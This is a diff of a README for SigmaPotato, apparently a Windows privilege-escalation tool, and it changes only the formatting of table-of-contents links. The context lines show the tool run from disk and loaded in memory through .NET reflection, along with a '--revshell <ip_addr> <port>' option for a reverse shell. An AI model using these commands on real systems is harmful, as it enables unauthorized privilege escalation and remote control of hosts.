@@ -80,7 +80,7 @@ and output verbosity for a more intuitive and effective user experience.
     o (will likely only be applicable when using reflection) 
 ```
 
-[**``Return to Table of Contents``**](#tableContents)
+[**Return to Table of Contents**](#tableContents)
 
 
 # General Usage <a name="generalUsage"></a>
@@ -94,7 +94,7 @@ Checking the help message with ``--help``
 
 ![Help](https://cdn.discordapp.com/attachments/855920119292362802/1156634215748730951/image.png?ex=6515af0e&is=65145d8e&hm=7cfacf49ff65f434e74590ed4d2e64433984a1b7970a9b2030fce94e0859ff6e&)
 
-[**``Return to Table of Contents``**](#tableContents)
+[**Return to Table of Contents**](#tableContents)
 
 
 ## Usage from Disk via the Binary <a name="binaryUsage"></a>
@@ -113,7 +113,7 @@ The easiest way to use ``SigmaPotato`` is by interacting with the binary like yo
 ./SigmaPotato.exe --help
 ```
 
-[**``Return to Table of Contents``**](#tableContents)
+[**Return to Table of Contents**](#tableContents)
 
 
 ## Usage from Memory via .NET Reflection <a name="reflectionUsage"></a>
@@ -155,7 +155,7 @@ $RevShell = @("--revshell", "<ip_addr>", "<port>")
 ```
 - Note: as of ``v1.2.5``, execution no longer requires ``[SigmaPotato.Program]``
 
-[**``Return to Table of Contents``**](#tableContents)
+[**Return to Table of Contents**](#tableContents)
 
 
 ## Error Correction <a name="errorCorrection"></a>
@@ -193,7 +193,7 @@ PS C:\Users\JoeSchmoe> .\SigmaPotato.exe --revshell
 
 ![Invalid Privileges](https://cdn.discordapp.com/attachments/855920119292362802/1156637078499631224/image.png?ex=6515b1b8&is=65146038&hm=58b95348a4114bac583c6c5259a8c143b2c3f4f56bff8d9217a4c592c9d3e962&)
 
-[**``Return to Table of Contents``**](#tableContents)
+[**Return to Table of Contents**](#tableContents)
 
 
 ## Examples <a name="examples"></a>
@@ -212,7 +212,7 @@ Below are two examples of ``SigmaPotato.exe`` usage.
 
 ![Reflection w/ Custom Payload](https://cdn.discordapp.com/attachments/855920119292362802/1156640112030011412/image.png?ex=6515b48c&is=6514630c&hm=86d25d61fc18ddf6b4cb03ee5a3a898fd4ae7904ed5c5e08d3bb0c5c5f1777e4&)
 
-[**``Return to Table of Contents``**](#tableContents)
+[**Return to Table of Contents**](#tableContents)
 
 
 # Windows OS Version Compatibility <a name="versionCompatiblity"></a>
@@ -239,7 +239,7 @@ execution.  So if you plan to only use reflection, this version would be optimal
 | Windows 8/8.1 - Windows 11 |
 | Windows Server 2012 - Windows 2022 |
 
-[**``Return to Table of Contents``**](#tableContents)
+[**Return to Table of Contents**](#tableContents)
 
 
 # Credits & Thanks <a name="credits"></a>
@@ -250,7 +250,7 @@ hard work. <a name="beichenDream"></a>
 - Huge shoutout to [@NukingDragons](https://github.com/nukingdragons) for being way smarter than me
 and helping with the local environment block bootstrap. <a name="nukingDragons"></a>
 
-[**``Return to Table of Contents``**](#tableContents)
+[**Return to Table of Contents**](#tableContents)
 
 ---
 
